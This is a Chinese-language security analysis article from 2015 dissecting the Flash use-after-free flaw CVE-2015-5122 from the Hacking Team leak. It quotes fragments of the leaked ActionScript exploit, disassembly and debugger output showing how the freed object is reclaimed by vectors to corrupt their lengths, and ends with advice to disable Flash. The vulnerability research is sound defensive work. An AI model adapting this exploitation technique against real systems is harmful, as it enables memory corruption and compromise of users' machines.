<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Hacking Team攻击代码分析Part 4: Flash 0day漏洞 CVE-2015-5122</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">360安全卫士</a> <span class="bull">·</span> <time title="2015/07/11 18:18" ui-time="" datetime="2015/07/11 18:18" class="published ng-binding ng-isolate-scope">2015/07/11 18:18</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>前几天我们分析了Hacking Team泄露数据中的3个exploit，包括一个flash 0day，一个flash nday和一个windows字体提权0day。昨天Adobe在发布了最新的flash版本（18.0.0.203），修补了其中的flash 0day（CVE-2015-5119）。然而今天twitter上面又有研究者爆猛料，称Hacking Team泄露数据中还有一个未修补的flash 0day，在最新的flash版本中仍然可以触发。Adobe随后也发布了对应的安全公告APSA15-04，漏洞的CVE编号为：CVE-2015-5122。影响Windows、MacOSX和Linux平台上的IE、Chrome浏览器等主流浏览器。</p><p><img alt="enter image description here" img-src="4eb38ef9f1a40a74972db5581b0dc98abda4087d.jpg"></p><p>我们经过分析，确认这确实又是一个新的flash 0day，漏洞成因是DisplayObject在设置opaqueBackground属性时，没有正确处理可能发生的回调（又是valueOf，是在下输了），而产生的Use After Free漏洞。本文将分析这个漏洞的成因和利用方式。</p><h1>0x01 漏洞原理分析</h1><hr><p>出问题的函数是DisplayObject对象的opaqueBackground属性设置函数：</p><p>我们来看一下HackingTeam泄露的exploit代码，关键部分如下：</p><pre><code>#!c++
1   for(i=_arLen1; i &lt; _arLen2; i++)
2       _ar[i] = _tb.createTextLine(); // fill 1016-byte holes (0x38c is a size of internal TextLine object)
3       for(i=_arLen1; i &lt; _arLen2; i++)
4           _ar[i].opaqueBackground = 1; // alloc 1016 bytes
</code></pre><p>在这个过程中会每个TextLine Object内部会分配0x390大小的对象，对象分配的代码在：</p><pre><code>1   .text:1025DC71                 push    1
2   .text:1025DC73                 push    eax
3   .text:1025DC74                 push    390h
4   .text:1025DC79                 call    operator_new2
</code></pre><p>调试过程中分配的0x390内部对象地址：</p><pre><code>Allocate 0x390 object:04cbc810
Allocate 0x390 object:0513c810
Allocate 0x390 object:0513cc08
Allocate 0x390 object:05d94020
Allocate 0x390 object:05d94418
Allocate 0x390 object:05d94810
Allocate 0x390 object:05d94c08
Allocate 0x390 object:05d95020
Allocate 0x390 object:05d95418
Allocate 0x390 object:05d95810
Allocate 0x390 object:05d95c08
Allocate 0x390 object:05d96020
Allocate 0x390 object:05d96418
Allocate 0x390 object:05d96810
Allocate 0x390 object:05d96c08
Allocate 0x390 object:05d97020
Allocate 0x390 object:05d97418
</code></pre><p>2 设置opaqueBackground，触发valueOf函数调用：</p><pre><code>1   MyClass.prototype.valueOf = valueOf2;
2                    
3   // here we go, call the vulnerable setter
4   _cnt = _arLen2-6;
5   _ar[_cnt].opaqueBackground = _mc;
</code></pre><p>和之前两个漏洞一样，exploit定义了自己的类，设置valueOf函数，然后在opaqueBackground的设置函数中，我们可以看到有一个将传入的参数转换为integer的过程，这个调用触发了MyClass的valueOf函数：</p><pre><code>.text:1025DD4C loc_1025DD4C: CODE XREF: set_opaqueBackground+2Fj
.text:1025DD4C                 push    ebx
.text:1025DD4D                 push    [esp+10h+param]
.text:1025DD51                 call    <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="88b7e1e6fcedefedfac8c9fee5cbe7faed">[email&#160;protected]</a>@avmplus@@<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="4a190b02020a10">[email&#160;protected]</a> ; avmplus::AvmCore::integer(int)
</code></pre><p>3 在valueOf函数中，释放TextLine Object，并使用vector占位</p><pre><code>#!c++
01  static function valueOf2()
02  {
03      try
04      {  
05          if (++_cnt &lt; _arLen2) {
06              // recursive call for next TextLine
07              _ar[_cnt].opaqueBackground = _mc;
08          }else{
09              Log("MyClass.valueOf2()");
10               
11              // free internal objects
12              for(var i:int=1; i &lt;= 5; i++)
13                  _tb.recreateTextLine(_ar[_arLen2-i]);
14               
15              // reuse freed memory
16              for(i=_arLen2; i &lt; _arLen; i++)
17                  _ar[i].length = _vLen;
18          }
19      }
20      catch (e:Error)
21      {
22          Log("valueOf2 " + e.toString());
23      }
24      return _vLen+8;
25  }
</code></pre><p>我们可以看到valueOf函数通过调用recreateTextLine释放了原来的TextLine对象（因此0x390大小的内部对象也将被释放）。然后使用0x190大小的vector<uint>对象试图占用已经释放的0x390大小对象的内存。这里之所以选用0x190大小的vector，是因为之后代码会对已经释放的0x390内部对象进行一个写操作，这个写操作的偏移是0x320，正好是0x190的两倍，这样写的时候可以直接写到vector的长度字段。这里用了一个技巧：用不同大小的对象去占位时，必须以页为单位释放原对象的内存，才有可能成功（也就是说这里必须连续释放多个0x390大小的内部对象，造成至少一个page（0x1000）内存被释放，然后才能用0x190的vector去占它）。</uint></p><p>4 从valueOf返回，已经释放的0x390内部对象被写入</p><pre><code>#!bash
eax=00000000 ebx=0000006a ecx=05d92708 edx=00000006 esi=05d97020 edi=0515dd78
eip=631bdd7e esp=0300bfec ebp=05d92708 iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200246
Flash32_18_0_0_203!DllUnregisterServer+0x7489c:
631bdd7e 889e20030000 mov byte ptr [esi+320h],bl ds:0023:05d97340=62
0:006&gt; dd esi
05d97020 00000062
04cb3000 00000037 00000000
</code></pre><p>Esi指向已经被释放的0x390大小对象（0x5d97020），可以参考前面分配时记录的对象地址，很容易看出这是其中一个0x390对象。写入的是esi+0x320处，可以看到已经被vector占用，并且指向某个vector的长度字段（0x62）。 写操作完成后，vector长度被篡改为0x6a:</p><pre><code>0:006&gt; p
0:006&gt; dd esi+320 L4
05d97340  0000006a 04cb3000 00000039 00000000
</code></pre><p>之后exploit再利用这个稍微变长了一点点的vector，修改紧邻的下一个vector的长度为0x40000000：</p><pre><code>0:006&gt; dd 5D974D0L4
05d974d0  40000000 04fc3000 0000003a 00000000
</code></pre><h1>0x02 漏洞防范</h1><hr><p>由于该漏洞利用非常稳定，而Adobe暂时没有发布该漏洞的补丁，我们建议补丁发布之前，可以暂时先禁用flash插件。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">安瑞熙</span> <span class="reply-time">2015-07-25 11:29:59</span></div><p></p><p>360 的感觉还是比较好点的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">二狗子</span> <span class="reply-time">2015-07-13 10:26:26</span></div><p></p><p>建议安装360安全卫士</p><p></p></div></div></div></div></div></main>